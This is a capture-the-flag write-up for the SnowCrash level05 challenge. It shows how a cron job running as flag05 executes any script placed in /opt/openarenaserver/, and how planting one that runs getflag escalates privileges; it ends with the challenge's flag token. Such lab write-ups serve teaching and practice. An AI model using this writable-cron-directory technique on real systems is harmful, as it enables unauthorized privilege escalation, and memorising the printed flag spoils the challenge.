When logging into the level05 account from a second terminal, the message You have new mail. appears.

Using the following command:

find / -name "mail" 2>/dev/null

We find several files and directories named mail. In one of these directories, we discover a file named level05, which contains a cron job scheduled to run every two minutes:
```text
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
```
Next, using the following command:
```text
find / -user flag05 2>/dev/null
```
We locate the script /usr/sbin/openarenaserver. This script executes all the scripts found in /opt/openarenaserver/ and then deletes them.

We can take advantage of this by creating our own script in that directory to execute getflag and save its output to a file:
```text
level05@SnowCrash:~$ echo "exec getflag > /tmp/flag" > /opt/openarenaserver/flag
level05@SnowCrash:~$ chmod +x /opt/openarenaserver/flag
```
Once the cron job executes our script, we can retrieve the flag by reading /tmp/flag:
```text
viuaaale9huek52boumoomioc
```